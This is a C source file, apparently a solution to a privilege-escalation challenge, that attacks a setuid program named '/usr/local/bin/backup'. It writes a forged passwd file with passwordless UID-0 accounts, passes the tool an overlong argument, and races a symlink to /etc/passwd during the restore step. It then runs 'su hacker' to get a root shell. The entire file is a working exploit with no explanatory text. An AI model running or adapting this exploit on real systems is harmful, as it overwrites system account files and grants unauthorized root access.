#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>

#define TARGET "/usr/local/bin/backup"

int main() {

        FILE *passwd;

        int pid;

        //so that we generate a new one in /home/user
        remove("passwd");


        passwd = fopen("/sharepasswd", "w");
        if (passwd != NULL) {
                fputs("root::0:0:root:/root:/bin/bash\n", passwd);
                fputs("hacker::0:0:root:/root:/bin/bash\n", passwd);
                fputs("halt::0:1001::/:/sbin/halt\n", passwd);
                fputs("user::1000:1000::/home/user:/bin/sh\n", passwd);

                fclose(passwd);
        }


        // will backup in /home/user as file passwd
 	system("/usr/local/bin/backup backup /share/passwd \x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\0");

        pid = fork();
        if(pid == 0) {
                usleep(999999);
                printf("\nNOW\n");
                symlink("/etc/passwd", "passwd");
                return 0;
        } else if (pid > 0) {
                 system("/usr/local/bin/backup restore passwd \x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\0");

                remove("passwd");
                waitpid(pid, NULL, 0);
                system("su hacker");
        } else {
                puts("Cannot fork\n");
        }

        return 0;
}
